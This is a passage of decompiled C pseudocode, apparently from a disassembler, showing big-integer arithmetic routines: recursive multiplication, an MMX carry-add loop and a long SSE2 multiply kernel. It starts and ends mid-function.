    v8 = 0;
  v23 = v8;
  off_48C068(v6, a1, a3 + 4 * v8, a3 + 4 * (v6 ^ v8));
  v9 = a4 + 4 * v6;
  v10 = sub_411259(a4, v9, v19);
  v11 = a5 >> 1;
  if ( v10 > 0 )
    v11 = 0;
  v24 = v11;
  v20 = a1 + 4 * v19;
  off_48C068(v19, v20, a4 + 4 * v11, a4 + 4 * (v19 ^ v11));
  v12 = a2 + 4 * a5;
  v22 = (unsigned int *)(a1 + 4 * a5);
  sub_412E84(v22, v12, a3 + 4 * (a5 >> 1), v9, v19);
  v13 = v20;
  sub_412E84(a2, v12, a1, v20, v19);
  sub_412E84(a1, v12, a3, a4, v19);
  v14 = off_48C064(v22, v20);
  v21 = off_48C064(v22, a1) + v14;
  v25 = (unsigned int *)(a1 + 4 * (a5 + v19));
  v16 = off_48C064(a1 + 4 * a5, v25) + v14;
  if ( v23 == v24 )
    v17 = v16 - off_48C068(a5, v13, v13, a2);
  else
    v17 = off_48C064(v13, a2) + v16;
  v18 = sub_411C95(v22, v19, v21);
  return sub_411C95(v25, v19, v18 + v17);
}
// 48C064: using guessed type int (__stdcall *off_48C064)(_DWORD, _DWORD);
// 48C068: using guessed type int (__fastcall *off_48C068)(_DWORD, _DWORD, _DWORD, _DWORD);
// 48C06C: using guessed type int dword_48C06C;
// 490C3C: using guessed type int dword_490C3C[];

//----- (0041302C) --------------------------------------------------------
int __cdecl sub_41302C(int a1, int a2, int a3, int a4, unsigned int a5)
{
  unsigned int v6; // edi
  unsigned int v7; // esi
  unsigned int v8; // [esp+18h] [ebp+14h]

  if ( a5 <= dword_48C06C )
    return ((int (__cdecl *)(int, int, int))dword_490C60[a5 >> 2])(a1, a3, a4);
  v8 = a5 >> 1;
  sub_412E84(a1, a2, a3, a4, v8);
  v6 = a2 + 4 * v8;
  sub_41302C(a2, v6, a3 + 4 * v8, a4, v8);
  v7 = a1 + 4 * v8;
  off_48C064(v7, a2);
  sub_41302C(a2, v6, a3, a4 + 4 * v8, v8);
  return off_48C064(v7, a2);
}
// 48C064: using guessed type int (__stdcall *off_48C064)(_DWORD, _DWORD);
// 48C06C: using guessed type int dword_48C06C;
// 490C60: using guessed type int dword_490C60[];

//----- (004130D8) --------------------------------------------------------
int __cdecl sub_4130D8(int a1, int a2, int a3, unsigned int a4)
{
  int v5; // ebx
  int v6; // esi
  int v7; // esi
  int v8; // eax

  if ( a4 <= dword_48C06C )
    return ((int (__cdecl *)(int, int))dword_490C84[a4 >> 2])(a1, a3);
  v5 = a2 + 4 * a4;
  sub_4130D8(a1, v5, a3, a4 >> 1);
  v6 = a3 + 4 * (a4 >> 1);
  sub_4130D8(a1 + 4 * a4, v5, v6, a4 >> 1);
  sub_412E84(a2, v5, a3, v6, a4 >> 1);
  v7 = off_48C064(a1 + 4 * (a4 >> 1), a2);
  v8 = off_48C064(a1 + 4 * (a4 >> 1), a2);
  return sub_411C95((unsigned int *)(a1 + 4 * (a4 + (a4 >> 1))), a4 >> 1, v8 + v7);
}
// 48C064: using guessed type int (__stdcall *off_48C064)(_DWORD, _DWORD);
// 48C06C: using guessed type int dword_48C06C;
// 490C84: using guessed type int dword_490C84[];

//----- (00413195) --------------------------------------------------------
_DWORD *__stdcall sub_413195(_DWORD *a1, int a2)
{
  return sub_40EF6C(a1, a2);
}

//----- (004131A5) --------------------------------------------------------
_DWORD *__thiscall sub_4131A5(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // ecx

  v4 = this[6];
  if ( a2[3] == v4 && *(_DWORD *)(a3 + 12) == v4 )
  {
    if ( off_48C068(a2[3], a2[4], a2[4], *(_DWORD *)(a3 + 16)) )
      off_48C064(a2[4], this[7]);
  }
  else
  {
    sub_40EF6C(a2, a3);
    if ( a2[5] == 1 )
      sub_40EF1C(a2, (int)(this + 3));
  }
  return a2;
}
// 48C064: using guessed type int (__stdcall *off_48C064)(_DWORD, _DWORD);
// 48C068: using guessed type int (__fastcall *off_48C068)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00413204) --------------------------------------------------------
int __thiscall sub_413204(_DWORD **this, int a2, int a3)
{
  int *v3; // eax

  v3 = (int *)(*(int (__thiscall **)(_DWORD *, int, int))(*this[1] + 72))(this[1], a2, a3);
  return sub_40EC6C(a2, v3);
}

//----- (00413329) --------------------------------------------------------
int __cdecl sub_413329(unsigned int a1)
{
  if ( a1 <= 8 )
    return dword_46C9A0[a1];
  if ( a1 <= 0x10 )
    return 16;
  if ( a1 <= 0x20 )
    return 32;
  if ( a1 <= 0x40 )
    return 64;
  --a1;
  return 1 << sub_40A926(&a1);
}
// 46C9A0: using guessed type int dword_46C9A0[9];

//----- (00413372) --------------------------------------------------------
int __fastcall sub_413372(int a1, int a2, int a3, int a4)
{
  int v4; // eax
  int v5; // edi
  int v6; // edx
  int v7; // ecx
  __m64 v8; // mm2
  __m64 v9; // mm2
  __m64 v10; // mm2
  __m64 v11; // mm2
  __m64 v12; // mm2
  int result; // eax

  v4 = a3 + 4 * a1;
  v5 = a4 + 4 * a1;
  v6 = a2 + 4 * a1;
  v7 = -a1;
  v8.m64_u64 = 0i64;
  if ( v7 )
  {
    if ( (v7 & 2) == 0 )
      goto LABEL_4;
    v7 -= 2;
    while ( 1 )
    {
      v11 = _mm_add_si64(
              v8,
              _mm_add_si64(
                _mm_cvtsi32_si64(*(_DWORD *)(v4 + 4 * v7 + 8)),
                _mm_cvtsi32_si64(*(_DWORD *)(v5 + 4 * v7 + 8))));
      *(_DWORD *)(v6 + 4 * v7 + 8) = _mm_cvtsi64_si32(v11);
      v12 = _mm_add_si64(
              _m_psrlqi(v11, 0x20u),
              _mm_add_si64(
                _mm_cvtsi32_si64(*(_DWORD *)(v4 + 4 * v7 + 12)),
                _mm_cvtsi32_si64(*(_DWORD *)(v5 + 4 * v7 + 12))));
      *(_DWORD *)(v6 + 4 * v7 + 12) = _mm_cvtsi64_si32(v12);
      v8 = _m_psrlqi(v12, 0x20u);
      v7 += 4;
      if ( !v7 )
        break;
LABEL_4:
      v9 = _mm_add_si64(
             v8,
             _mm_add_si64(_mm_cvtsi32_si64(*(_DWORD *)(v4 + 4 * v7)), _mm_cvtsi32_si64(*(_DWORD *)(v5 + 4 * v7))));
      *(_DWORD *)(v6 + 4 * v7) = _mm_cvtsi64_si32(v9);
      v10 = _mm_add_si64(
              _m_psrlqi(v9, 0x20u),
              _mm_add_si64(
                _mm_cvtsi32_si64(*(_DWORD *)(v4 + 4 * v7 + 4)),
                _mm_cvtsi32_si64(*(_DWORD *)(v5 + 4 * v7 + 4))));
      *(_DWORD *)(v6 + 4 * v7 + 4) = _mm_cvtsi64_si32(v10);
      v8 = _m_psrlqi(v10, 0x20u);
    }
  }
  result = _mm_cvtsi64_si32(v8);
  _m_empty();
  return result;
}

//----- (00413409) --------------------------------------------------------
void __cdecl sub_413409(int a1, int a2, int a3)
{
  unsigned int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm5
  __m128i si128; // xmm6
  __m128i v10; // xmm4
  __m128i v11; // xmm7
  __m128i v12; // xmm6
  __m128i v13; // xmm7
  __m128i v14; // xmm0
  __m128i v15; // xmm1
  __m128i v16; // xmm4
  __m128i v17; // xmm5
  __m128i v18; // xmm6
  __m128i v19; // xmm5
  __m128i v20; // xmm4
  __m128i v21; // xmm7
  __m128i v22; // xmm0
  __m128i v23; // xmm7
  __m128i v24; // xmm6
  __m128i v25; // xmm4
  __m128i v26; // xmm5
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm0
  __m128i v30; // xmm1
  __m128i v31; // xmm4
  __m128i v32; // xmm5
  int v33; // ecx
  __m128i v34; // xmm6
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm0
  __m128i *v39; // edx
  __m128i v40; // xmm7
  __m128i v41; // xmm6
  __m128i v42; // xmm4
  __m128i v43; // xmm5
  __m128i v44; // xmm6
  __m128i v45; // xmm7
  __m128i v46; // xmm0
  __m128i v47; // xmm1
  __m128i v48; // xmm4
  __m128i v49; // xmm5
  int v50; // ecx
  __m128i v51; // xmm6
  __m128i v52; // xmm5
  __m128i v53; // xmm4
  __m128i *v54; // edx
  __m128i v55; // xmm7
  __m128i v56; // xmm0
  __m128i v57; // xmm7
  __m128i v58; // xmm6
  __m128i v59; // xmm4
  __m128i v60; // xmm5
  __m128i v61; // xmm6
  __m128i v62; // xmm7
  __m128i v63; // xmm0
  __m128i v64; // xmm1
  __m128i v65; // xmm4
  __m128i v66; // xmm5
  int v67; // ecx
  __m128i v68; // xmm6
  __m128i v69; // xmm5
  __m128i v70; // xmm4
  __m128i v71; // xmm7
  __m128i v72; // xmm0
  __m128i *v73; // edx
  __m128i v74; // xmm7
  __m128i v75; // xmm6
  __m128i v76; // xmm4
  __m128i v77; // xmm5
  __m128i v78; // xmm6
  __m128i v79; // xmm7
  __m128i v80; // xmm0
  __m128i v81; // xmm1
  __m128i v82; // xmm4
  __m128i v83; // xmm5
  int v84; // ecx
  __m128i v85; // xmm6
  __m128i v86; // xmm5
  __m128i v87; // xmm4
  __m128i *v88; // edx
  __m128i v89; // xmm7
  __m128i v90; // xmm0
  __m128i v91; // xmm7
  __m128i v92; // xmm6
  __m128i v93; // xmm4
  __m128i v94; // xmm5
  __m128i v95; // xmm6
  __m128i v96; // xmm7
  __m128i v97; // xmm0
  __m128i v98; // xmm1
  __m128i v99; // xmm4
  __m128i v100; // xmm5
  int v101; // ecx
  __m128i v102; // xmm6
  __m128i v103; // xmm5
  __m128i v104; // xmm4
  __m128i v105; // xmm7
  __m128i v106; // xmm0
  __m128i *v107; // edx
  __m128i v108; // xmm7
  __m128i v109; // xmm6
  __m128i v110; // xmm4
  __m128i v111; // xmm5
  __m128i v112; // xmm6
  __m128i v113; // xmm7
  __m128i v114; // xmm0
  __m128i v115; // xmm1
  __m128i v116; // xmm4
  __m128i v117; // xmm5
  int v118; // ecx
  __m128i v119; // xmm6
  __m128i v120; // xmm5
  __m128i v121; // xmm4
  __m128i *v122; // edx
  __m128i v123; // xmm7
  __m128i v124; // xmm0
  __m128i v125; // xmm7
  __m128i v126; // xmm6
  __m128i v127; // xmm4
  __m128i v128; // xmm5
  __m128i v129; // xmm6
  __m128i v130; // xmm7
  __m128i v131; // xmm0
  __m128i v132; // xmm1
  __m128i v133; // xmm4
  __m128i v134; // xmm5
  int v135; // ecx
  __m128i v136; // xmm6
  __m128i v137; // xmm5
  __m128i v138; // xmm4
  __m128i v139; // xmm7
  __m128i v140; // xmm0
  __m128i *v141; // edx
  __m128i v142; // xmm7
  __m128i v143; // xmm6
  __m128i v144; // xmm4
  __m128i v145; // xmm5
  __m128i v146; // xmm6
  __m128i v147; // xmm7
  __m128i v148; // xmm0
  __m128i v149; // xmm1
  __m128i v150; // xmm4
  __m128i v151; // xmm5
  int v152; // ecx
  __m128i v153; // xmm6
  __m128i v154; // xmm5
  __m128i v155; // xmm4
  __m128i *v156; // edx
  __m128i v157; // xmm7
  __m128i v158; // xmm0
  __m128i v159; // xmm7
  __m128i v160; // xmm6
  __m128i v161; // xmm4
  __m128i v162; // xmm5
  __m128i v163; // xmm6
  __m128i v164; // xmm7
  __m128i v165; // xmm0
  __m128i v166; // xmm1
  __m128i v167; // xmm4
  __m128i v168; // xmm5
  int v169; // ecx
  __m128i v170; // xmm6
  __m128i v171; // xmm5
  __m128i v172; // xmm4
  __m128i v173; // xmm7
  __m128i v174; // xmm0
  __m128i *v175; // edx
  __m128i v176; // xmm7
  __m128i v177; // xmm6
  __m128i v178; // xmm4
  __m128i v179; // xmm5
  __m128i v180; // xmm6
  __m128i v181; // xmm7
  __m128i v182; // xmm0
  __m128i v183; // xmm1
  __m128i v184; // xmm4
  __m128i v185; // xmm5
  int v186; // ecx
  __m128i v187; // xmm6
  __m128i v188; // xmm5
  __m128i v189; // xmm4
  __m128i *v190; // edx
  __m128i v191; // xmm7
  __m128i v192; // xmm0
  __m128i v193; // xmm7
  __m128i v194; // xmm6
  __m128i v195; // xmm4
  __m128i v196; // xmm5
  __m128i v197; // xmm6
  __m128i v198; // xmm7
  __m128i v199; // xmm0
  __m128i v200; // xmm1
  __m128i v201; // xmm4
  __m128i v202; // xmm5
  int v203; // ecx
  __m128i v204; // xmm6
  __m128i v205; // xmm5
  __m128i v206; // xmm4
  __m128i v207; // xmm7
  __m128i v208; // xmm0
  __m128i *v209; // edx
  __m128i v210; // xmm7
  __m128i v211; // xmm6
  __m128i v212; // xmm4
  __m128i v213; // xmm5
  __m128i v214; // xmm6
  __m128i v215; // xmm7
  __m128i v216; // xmm0
  __m128i v217; // xmm1
  __m128i v218; // xmm4
  __m128i v219; // xmm5
  int v220; // ecx
  __m128i v221; // xmm6
  __m128i v222; // xmm5
  __m128i v223; // xmm4
  __m128i *v224; // edx
  __m128i v225; // xmm7
  __m128i v226; // xmm0
  __m128i v227; // xmm7
  __m128i v228; // xmm6
  __m128i v229; // xmm4
  __m128i v230; // xmm5
  __m128i v231; // xmm6
  __m128i v232; // xmm7
  __m128i v233; // xmm0
  __m128i v234; // xmm1
  __m128i v235; // xmm4
  __m128i v236; // xmm5
  int v237; // ecx
  __m128i v238; // xmm6
  __m128i v239; // xmm5
  __m128i v240; // xmm4
  __m128i v241; // xmm7
  __m128i v242; // xmm0
  __m128i *v243; // edx
  __m128i v244; // xmm7
  __m128i v245; // xmm6
  __m128i v246; // xmm2
  __m128i v247; // xmm5
  __m128i v248; // xmm6
  __m128i v249; // xmm7
  __m128i v250; // xmm0
  __m128i v251; // xmm1
  __m128i v252; // xmm4
  __m128i v253; // xmm5
  __m128i v254; // xmm6
  __m128i v255; // [esp+10h] [ebp-18Ch] BYREF
  __m128i v256; // [esp+20h] [ebp-17Ch] BYREF
  __m128i v257; // [esp+30h] [ebp-16Ch] BYREF
  __m128i v258; // [esp+40h] [ebp-15Ch] BYREF
  __m128i v259; // [esp+50h] [ebp-14Ch] BYREF
  __m128i v260; // [esp+60h] [ebp-13Ch] BYREF
  __m128i v261; // [esp+70h] [ebp-12Ch] BYREF
  __m128i v262; // [esp+80h] [ebp-11Ch] BYREF
  __m128i v263; // [esp+90h] [ebp-10Ch]
  __m128i v264[7]; // [esp+A0h] [ebp-FCh]
  __m128i v265; // [esp+110h] [ebp-8Ch] BYREF
  __m128i v266; // [esp+120h] [ebp-7Ch] BYREF
  __m128i v267; // [esp+130h] [ebp-6Ch] BYREF
  __m128i v268; // [esp+140h] [ebp-5Ch] BYREF
  __m128i v269; // [esp+150h] [ebp-4Ch] BYREF
  __m128i v270; // [esp+160h] [ebp-3Ch] BYREF
  __m128i v271; // [esp+170h] [ebp-2Ch] BYREF
  __m128i v272; // [esp+180h] [ebp-1Ch] BYREF

  for ( i = 0; i != 64; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)((char *)&v255 + 2 * i) = v4;
    *(__m128i *)((char *)&v256 + 2 * i) = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v263 + 2 * i) = v5;
    v264[i / 8] = _mm_srli_epi64(v5, 0x20u);
    *(__m128i *)((char *)&v265 + 2 * i) = v6;
    *(__m128i *)((char *)&v266 + 2 * i) = _mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v265);
  v8 = _mm_mul_epu32(_mm_load_si128(&v255), v7);
  si128 = _mm_load_si128(&stru_46C990);
  v10 = _mm_and_si128(si128, v8);
  v11 = _mm_mul_epu32(v7, v263);
  v12 = _mm_and_si128(si128, v11);
  v13 = _mm_srli_epi32(v11, 0x10u);
  v14 = _mm_move_epi64(v12);
  v15 = _mm_move_epi64(v13);
  v16 = _mm_add_epi32(v10, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v12, v14), v14), 4));
  v17 = _mm_add_epi32(_mm_srli_epi32(v8, 0x10u), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  *(_DWORD *)a1 = _mm_cvtsi128_si32(v16);
  v18 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v16), 0x10u), _mm_move_epi64(v17));
  v19 = _mm_unpackhi_epi64(v17, v14);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v20 = _mm_add_epi32(_mm_unpackhi_epi64(v16, v14), _mm_srli_epi64(v18, 0x30u));
  v21 = _mm_load_si128(&v265);
  v22 = _mm_mul_epu32(_mm_load_si128(&v256), v21);
  v23 = _mm_mul_epu32(v21, v264[0]);
  v24 = _mm_load_si128(&stru_46C990);
  v25 = _mm_add_epi32(v20, _mm_and_si128(v24, v22));
  v26 = _mm_add_epi32(v19, _mm_srli_epi32(v22, 0x10u));
  v27 = _mm_and_si128(v24, v23);
  v28 = _mm_srli_epi32(v23, 0x10u);
  sub_413634((int)&v256, &v265);
  v29 = _mm_move_epi64(v27);
  v30 = _mm_move_epi64(v28);
  v31 = _mm_add_epi32(v25, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v29), v29), 4));
  v32 = _mm_add_epi32(v26, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v30), v30), 4));
  *(_DWORD *)(v33 + 8) = _mm_cvtsi128_si32(v31);
  v34 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v31), 0x10u), _mm_move_epi64(v32));
  v35 = _mm_unpackhi_epi64(v32, v29);
  *(_QWORD *)(v33 + 10) = v34.m128i_i64[0];
  v36 = _mm_add_epi32(_mm_unpackhi_epi64(v31, v29), _mm_srli_epi64(v34, 0x30u));
  v37 = _mm_load_si128(&v266);
  v38 = _mm_mul_epu32(_mm_load_si128(&v256), v37);
  v40 = _mm_mul_epu32(v37, *v39);
  v41 = _mm_load_si128(&stru_46C990);
  v42 = _mm_add_epi32(v36, _mm_and_si128(v41, v38));
  v43 = _mm_add_epi32(v35, _mm_srli_epi32(v38, 0x10u));
  v44 = _mm_and_si128(v41, v40);
  v45 = _mm_srli_epi32(v40, 0x10u);
  sub_4135F7();
  v46 = _mm_move_epi64(v44);
  v47 = _mm_move_epi64(v45);
  v48 = _mm_add_epi32(v42, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v44, v46), v46), 4));
  v49 = _mm_add_epi32(v43, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v45, v47), v47), 4));
  *(_DWORD *)(v50 + 16) = _mm_cvtsi128_si32(v48);
  v51 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v48), 0x10u), _mm_move_epi64(v49));
  v52 = _mm_unpackhi_epi64(v49, v46);
  *(_QWORD *)(v50 + 18) = v51.m128i_i64[0];
  v53 = _mm_add_epi32(_mm_unpackhi_epi64(v48, v46), _mm_srli_epi64(v51, 0x30u));
  v55 = _mm_load_si128(&v266);
  v56 = _mm_mul_epu32(_mm_load_si128(&v257), v55);
  v57 = _mm_mul_epu32(v55, v54[1]);
  v58 = _mm_load_si128(&stru_46C990);
  v59 = _mm_add_epi32(v53, _mm_and_si128(v58, v56));
  v60 = _mm_add_epi32(v52, _mm_srli_epi32(v56, 0x10u));
  v61 = _mm_and_si128(v58, v57);
  v62 = _mm_srli_epi32(v57, 0x10u);
  sub_4135BA();
  v63 = _mm_move_epi64(v61);
  v64 = _mm_move_epi64(v62);
  v65 = _mm_add_epi32(v59, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v61, v63), v63), 4));
  v66 = _mm_add_epi32(v60, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v62, v64), v64), 4));
  *(_DWORD *)(v67 + 24) = _mm_cvtsi128_si32(v65);
  v68 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v65), 0x10u), _mm_move_epi64(v66));
  v69 = _mm_unpackhi_epi64(v66, v63);
  *(_QWORD *)(v67 + 26) = v68.m128i_i64[0];
  v70 = _mm_add_epi32(_mm_unpackhi_epi64(v65, v63), _mm_srli_epi64(v68, 0x30u));
  v71 = _mm_load_si128(&v267);
  v72 = _mm_mul_epu32(_mm_load_si128(&v257), v71);
  v74 = _mm_mul_epu32(v71, *v73);
  v75 = _mm_load_si128(&stru_46C990);
  v76 = _mm_add_epi32(v70, _mm_and_si128(v75, v72));
  v77 = _mm_add_epi32(v69, _mm_srli_epi32(v72, 0x10u));
  v78 = _mm_and_si128(v75, v74);
  v79 = _mm_srli_epi32(v74, 0x10u);
  sub_41357D();
  v80 = _mm_move_epi64(v78);
  v81 = _mm_move_epi64(v79);
  v82 = _mm_add_epi32(v76, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v78, v80), v80), 4));
  v83 = _mm_add_epi32(v77, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v79, v81), v81), 4));
  *(_DWORD *)(v84 + 32) = _mm_cvtsi128_si32(v82);
  v85 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v82), 0x10u), _mm_move_epi64(v83));
  v86 = _mm_unpackhi_epi64(v83, v80);
  *(_QWORD *)(v84 + 34) = v85.m128i_i64[0];
  v87 = _mm_add_epi32(_mm_unpackhi_epi64(v82, v80), _mm_srli_epi64(v85, 0x30u));
  v89 = _mm_load_si128(&v267);
  v90 = _mm_mul_epu32(_mm_load_si128(&v258), v89);
  v91 = _mm_mul_epu32(v89, v88[1]);
  v92 = _mm_load_si128(&stru_46C990);
  v93 = _mm_add_epi32(v87, _mm_and_si128(v92, v90));
  v94 = _mm_add_epi32(v86, _mm_srli_epi32(v90, 0x10u));
  v95 = _mm_and_si128(v92, v91);
  v96 = _mm_srli_epi32(v91, 0x10u);
  sub_413540();
  v97 = _mm_move_epi64(v95);
  v98 = _mm_move_epi64(v96);
  v99 = _mm_add_epi32(v93, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v95, v97), v97), 4));
  v100 = _mm_add_epi32(v94, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v96, v98), v98), 4));
  *(_DWORD *)(v101 + 40) = _mm_cvtsi128_si32(v99);
  v102 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v99), 0x10u), _mm_move_epi64(v100));
  v103 = _mm_unpackhi_epi64(v100, v97);
  *(_QWORD *)(v101 + 42) = v102.m128i_i64[0];
  v104 = _mm_add_epi32(_mm_unpackhi_epi64(v99, v97), _mm_srli_epi64(v102, 0x30u));
  v105 = _mm_load_si128(&v268);
  v106 = _mm_mul_epu32(_mm_load_si128(&v258), v105);
  v108 = _mm_mul_epu32(v105, *v107);
  v109 = _mm_load_si128(&stru_46C990);
  v110 = _mm_add_epi32(v104, _mm_and_si128(v109, v106));
  v111 = _mm_add_epi32(v103, _mm_srli_epi32(v106, 0x10u));
  v112 = _mm_and_si128(v109, v108);
  v113 = _mm_srli_epi32(v108, 0x10u);
  sub_413503();
  v114 = _mm_move_epi64(v112);
  v115 = _mm_move_epi64(v113);
  v116 = _mm_add_epi32(v110, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v112, v114), v114), 4));
  v117 = _mm_add_epi32(v111, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v113, v115), v115), 4));
  *(_DWORD *)(v118 + 48) = _mm_cvtsi128_si32(v116);
  v119 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v116), 0x10u), _mm_move_epi64(v117));
  v120 = _mm_unpackhi_epi64(v117, v114);
  *(_QWORD *)(v118 + 50) = v119.m128i_i64[0];
  v121 = _mm_add_epi32(_mm_unpackhi_epi64(v116, v114), _mm_srli_epi64(v119, 0x30u));
  v123 = _mm_load_si128(&v268);
  v124 = _mm_mul_epu32(_mm_load_si128(&v259), v123);
  v125 = _mm_mul_epu32(v123, v122[1]);
  v126 = _mm_load_si128(&stru_46C990);
  v127 = _mm_add_epi32(v121, _mm_and_si128(v126, v124));
  v128 = _mm_add_epi32(v120, _mm_srli_epi32(v124, 0x10u));
  v129 = _mm_and_si128(v126, v125);
  v130 = _mm_srli_epi32(v125, 0x10u);
  sub_4134C6();
  v131 = _mm_move_epi64(v129);
  v132 = _mm_move_epi64(v130);
  v133 = _mm_add_epi32(v127, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v129, v131), v131), 4));
  v134 = _mm_add_epi32(v128, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v130, v132), v132), 4));
  *(_DWORD *)(v135 + 56) = _mm_cvtsi128_si32(v133);
  v136 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v133), 0x10u), _mm_move_epi64(v134));
  v137 = _mm_unpackhi_epi64(v134, v131);
  *(_QWORD *)(v135 + 58) = v136.m128i_i64[0];
  v138 = _mm_add_epi32(_mm_unpackhi_epi64(v133, v131), _mm_srli_epi64(v136, 0x30u));
  v139 = _mm_load_si128(&v269);
  v140 = _mm_mul_epu32(_mm_load_si128(&v259), v139);
  v142 = _mm_mul_epu32(v139, *v141);
  v143 = _mm_load_si128(&stru_46C990);
  v144 = _mm_add_epi32(v138, _mm_and_si128(v143, v140));
  v145 = _mm_add_epi32(v137, _mm_srli_epi32(v140, 0x10u));
  v146 = _mm_and_si128(v143, v142);
  v147 = _mm_srli_epi32(v142, 0x10u);
  sub_413503();
  v148 = _mm_move_epi64(v146);
  v149 = _mm_move_epi64(v147);
  v150 = _mm_add_epi32(v144, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v146, v148), v148), 4));
  v151 = _mm_add_epi32(v145, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v147, v149), v149), 4));
  *(_DWORD *)(v152 + 64) = _mm_cvtsi128_si32(v150);
  v153 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v150), 0x10u), _mm_move_epi64(v151));
  v154 = _mm_unpackhi_epi64(v151, v148);
  *(_QWORD *)(v152 + 66) = v153.m128i_i64[0];
  v155 = _mm_add_epi32(_mm_unpackhi_epi64(v150, v148), _mm_srli_epi64(v153, 0x30u));
  v157 = _mm_load_si128(&v269);
  v158 = _mm_mul_epu32(_mm_load_si128(&v260), v157);
  v159 = _mm_mul_epu32(v157, v156[1]);
  v160 = _mm_load_si128(&stru_46C990);
  v161 = _mm_add_epi32(v155, _mm_and_si128(v160, v158));
  v162 = _mm_add_epi32(v154, _mm_srli_epi32(v158, 0x10u));
  v163 = _mm_and_si128(v160, v159);
  v164 = _mm_srli_epi32(v159, 0x10u);
  sub_413540();
  v165 = _mm_move_epi64(v163);
  v166 = _mm_move_epi64(v164);
  v167 = _mm_add_epi32(v161, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v163, v165), v165), 4));
  v168 = _mm_add_epi32(v162, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v164, v166), v166), 4));
  *(_DWORD *)(v169 + 72) = _mm_cvtsi128_si32(v167);
  v170 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v167), 0x10u), _mm_move_epi64(v168));
  v171 = _mm_unpackhi_epi64(v168, v165);
  *(_QWORD *)(v169 + 74) = v170.m128i_i64[0];
  v172 = _mm_add_epi32(_mm_unpackhi_epi64(v167, v165), _mm_srli_epi64(v170, 0x30u));
  v173 = _mm_load_si128(&v270);
  v174 = _mm_mul_epu32(_mm_load_si128(&v260), v173);
  v176 = _mm_mul_epu32(v173, *v175);
  v177 = _mm_load_si128(&stru_46C990);
  v178 = _mm_add_epi32(v172, _mm_and_si128(v177, v174));
  v179 = _mm_add_epi32(v171, _mm_srli_epi32(v174, 0x10u));
  v180 = _mm_and_si128(v177, v176);
  v181 = _mm_srli_epi32(v176, 0x10u);
  sub_41357D();
  v182 = _mm_move_epi64(v180);
  v183 = _mm_move_epi64(v181);
  v184 = _mm_add_epi32(v178, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v180, v182), v182), 4));
  v185 = _mm_add_epi32(v179, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v181, v183), v183), 4));
  *(_DWORD *)(v186 + 80) = _mm_cvtsi128_si32(v184);
  v187 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v184), 0x10u), _mm_move_epi64(v185));
  v188 = _mm_unpackhi_epi64(v185, v182);
  *(_QWORD *)(v186 + 82) = v187.m128i_i64[0];
  v189 = _mm_add_epi32(_mm_unpackhi_epi64(v184, v182), _mm_srli_epi64(v187, 0x30u));
  v191 = _mm_load_si128(&v270);
  v192 = _mm_mul_epu32(_mm_load_si128(&v261), v191);
  v193 = _mm_mul_epu32(v191, v190[1]);
  v194 = _mm_load_si128(&stru_46C990);
  v195 = _mm_add_epi32(v189, _mm_and_si128(v194, v192));
  v196 = _mm_add_epi32(v188, _mm_srli_epi32(v192, 0x10u));
  v197 = _mm_and_si128(v194, v193);
  v198 = _mm_srli_epi32(v193, 0x10u);
  sub_4135BA();
  v199 = _mm_move_epi64(v197);
  v200 = _mm_move_epi64(v198);
  v201 = _mm_add_epi32(v195, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v197, v199), v199), 4));
  v202 = _mm_add_epi32(v196, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v198, v200), v200), 4));
  *(_DWORD *)(v203 + 88) = _mm_cvtsi128_si32(v201);
  v204 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v201), 0x10u), _mm_move_epi64(v202));
  v205 = _mm_unpackhi_epi64(v202, v199);
